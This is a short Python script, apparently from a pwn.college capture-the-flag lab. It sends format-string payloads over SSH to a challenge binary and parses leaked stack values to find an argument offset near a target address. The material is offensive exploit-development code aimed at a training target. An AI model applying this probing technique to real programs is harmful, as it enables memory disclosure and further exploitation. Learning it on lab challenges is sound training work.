import subprocess, struct, re
addr=0x404100
mid='AAA ' + '%p '*60
pad=3
for idx in range(48, 60):
    fmt=f'AAAA|%142c|%{idx}'+mid
    payload=fmt.encode()+b'B'*pad+struct.pack('<Q',addr)
    res=subprocess.run(['ssh','-i','../key','hacker@dojo.pwn.college','/challenge/babyfmt_level4.0'],input=payload,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    out=res.stdout.decode(errors='ignore')
    parts=out.split('|')
    if len(parts)<3:
        continue
    after=parts[2].lstrip()
    m=re.match(r'([0-9a-fA-F]+)', after)
    if not m:
        val=None
    else:
        val=int(m.group(1),16)
    print(idx, val)
